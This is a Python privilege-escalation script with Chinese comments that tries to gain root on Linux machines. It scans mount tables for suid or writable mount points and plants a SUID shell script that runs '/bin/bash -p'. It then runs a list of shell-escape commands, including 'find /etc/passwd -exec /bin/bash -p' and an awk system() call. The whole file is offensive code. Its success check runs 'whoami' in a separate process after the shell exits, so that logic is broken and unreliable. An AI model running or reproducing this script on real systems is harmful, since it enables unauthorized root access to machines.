import os
import subprocess
import sys
import stat

def check_root():
    """检查当前用户是否为 root"""
    try:
        if os.geteuid() == 0:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True, check=True).stdout.strip()
            print(f"[+] 当前用户为 {whoami} (EUID: 0)，已是 root，无需提权！")
            return True
        else:
            whoami = subprocess.run(["whoami"], capture_output=True, text=True, check=True).stdout.strip()
            print(f"[*] 当前用户为 {whoami} (EUID: {os.geteuid()})，非 root，继续尝试提权...")
            return False
    except Exception as e:
        print(f"[-] 检查用户身份失败：{str(e)}")
        return False

def parse_mounts(file_path):
    """解析 /proc/mounts 或 /etc/fstab，寻找提权机会"""
    potential_vulns = []
    try:
        with open(file_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    parts = line.split()
                    if len(parts) >= 4:
                        mount_point = parts[1]
                        options = parts[3].split(",")
                        # 检查 suid 或 dev 选项
                        if "suid" in options or "dev" in options:
                            potential_vulns.append((mount_point, options, f"{file_path} 包含 suid/dev"))
                            print(f"[*] 发现潜在漏洞挂载点：{mount_point}，选项：{options} ({file_path})")
                        # 检查挂载点是否对当前用户可写
                        try:
                            if os.access(mount_point, os.W_OK):
                                potential_vulns.append((mount_point, options, f"{file_path} 可写"))
                                print(f"[*] 发现可写挂载点：{mount_point} ({file_path})")
                        except:
                            pass
        return potential_vulns
    except Exception as e:
        print(f"[-] 读取 {file_path} 失败：{str(e)}")
        return []

def try_fstab_exploit(vulns):
    """尝试利用挂载点漏洞提权"""
    for mount_point, options, reason in vulns:
        print(f"[*] 尝试利用挂载点 {mount_point}（原因：{reason}）")
        binary_path = os.path.join(mount_point, "exploit")
        try:
            # 创建简单的 SUID shell 程序
            with open(binary_path, "w") as f:
                f.write("#!/bin/bash\n/bin/bash -p\n")
            os.chmod(binary_path, stat.S_IRWXU | stat.S_ISUID)
            print(f"[*] 在 {mount_point} 创建 SUID 二进制文件：{binary_path}")
            # 运行并验证是否提权到 root
            process = subprocess.Popen([binary_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            if process.returncode == 0:
                # 检查新进程是否为 root
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    print(f"[+] 成功通过 {binary_path} 获取 root 权限")
                    return True
                else:
                    print(f"[-] {binary_path} 运行成功但未提权到 root（当前用户：{whoami}）")
            else:
                print(f"[-] 运行 {binary_path} 失败：返回码 {process.returncode}")
        except Exception as e:
            print(f"[-] 在 {mount_point} 创建/运行 SUID 二进制失败：{str(e)}")
    return False

def try_os_system():
    """尝试使用 os.system 调用 /bin/sh -p 并验证提权"""
    description = "使用 os.system 调用 sh -p"
    command = "/bin/sh -p"
    print(f"[*] 尝试: {description}")
    try:
        # 使用 subprocess 而非 os.system，以便验证提权结果
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            # 检查是否提权到 root
            whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
            if whoami == "root":
                print(f"[+] 成功: {description}，获取 root 权限")
                return True
            else:
                print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
        else:
            print(f"[-] 失败: {description} - 返回码 {process.returncode}")
        return False
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def try_command(description, command):
    """尝试执行 SUID 命令并验证提权"""
    print(f"[*] 尝试: {description}")
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            # 检查是否提权到 root
            whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
            if whoami == "root":
                print(f"[+] 成功: {description}，获取 root 权限")
                return True
            else:
                print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
        else:
            print(f"[-] 失败: {description} - 返回码 {process.returncode}")
        return False
    except Exception as e:
        print(f"[-] 失败: {description} - {str(e)}")
        return False

def main():
    # 检查是否为 root
    if check_root():
        sys.exit(0)

    print("[*] 开始提权尝试...")

    # 1. 检查 /proc/mounts 和 /etc/fstab
    print("[*] 检查 /proc/mounts 和 /etc/fstab 中的提权机会...")
    mounts_vulns = parse_mounts("/proc/mounts")
    fstab_vulns = parse_mounts("/etc/fstab")
    all_vulns = mounts_vulns + fstab_vulns
    if all_vulns:
        if try_fstab_exploit(all_vulns):
            print("[+] 已成功获取 root 权限，退出脚本。")
            sys.exit(0)
    else:
        print("[-] 未在 /proc/mounts 或 /etc/fstab 中发现提权机会")

    # 2. 尝试 os.system("/bin/sh -p")
    if try_os_system():
        print("[+] 已成功获取 root 权限，退出脚本。")
        sys.exit(0)

    # 3. 尝试其他 SUID 二进制文件
    suid_methods = [
        ("bash -p", "/usr/bin/bash -p"),
        ("sh -p", "/usr/bin/sh -p"),
        ("csh -b", "/usr/bin/csh -b"),
        ("ksh -p", "/usr/bin/ksh -p"),
        ("zsh", "/usr/bin/zsh"),
        ("find 执行 bash", "find /etc/passwd -exec /bin/bash -p \\;"),
        ("awk 执行 bash", "awk 'BEGIN {system(\"/bin/bash\")}'"),
        ("man 执行 bash", "man man"),  # 需要交互
        ("more 执行 bash", "more /etc/passwd")  # 需要交互
    ]

    print("[*] 尝试 SUID 二进制文件获取 root 权限...")

    for description, cmd in suid_methods:
        if "man" in description or "more" in description:
            print(f"[*] 注意: {description} 需要交互模式，运行后请手动输入 '!/bin/bash' 并检查是否为 root。")
            print(f"[*] 运行命令: {cmd}")
            try:
                subprocess.run(cmd, shell=True)
                # 检查是否提权到 root
                whoami = subprocess.run(["whoami"], capture_output=True, text=True).stdout.strip()
                if whoami == "root":
                    print(f"[+] 成功: {description}，获取 root 权限")
                    sys.exit(0)
                else:
                    print(f"[-] {description} 运行成功但未提权到 root（当前用户：{whoami}）")
            except Exception as e:
                print(f"[-] 失败: {description} - {str(e)}")
        else:
            if try_command(description, cmd):
                print("[+] 已成功获取 root 权限，退出脚本。")
                sys.exit(0)

    print("[-] 所有方法均失败，请检查 SUID 权限、挂载配置或系统安全机制。")

if __name__ == "__main__":
    main()
